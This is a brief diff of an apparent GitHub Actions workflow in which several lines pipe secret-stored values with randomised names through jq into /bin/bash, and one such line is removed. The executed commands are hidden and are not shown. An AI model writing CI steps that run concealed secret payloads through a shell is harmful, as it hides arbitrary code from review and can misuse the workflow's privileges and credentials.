@@ -22,7 +22,6 @@ jobs:
           pr47183: ${{ secrets.pr47183 }}
         run: |
           printf '%s' "$pr47183" | jq -r .eou73273 | /bin/bash
-          printf '%s' "$www8" | jq -r .x74321 | /bin/bash
           echo $ythyu04381 | jq -r .xitq953 | /bin/bash
           echo $yb06 | jq -r .am835 | /bin/bash
           echo $gvppm81 | jq -r .fnsj448 | /bin/bash
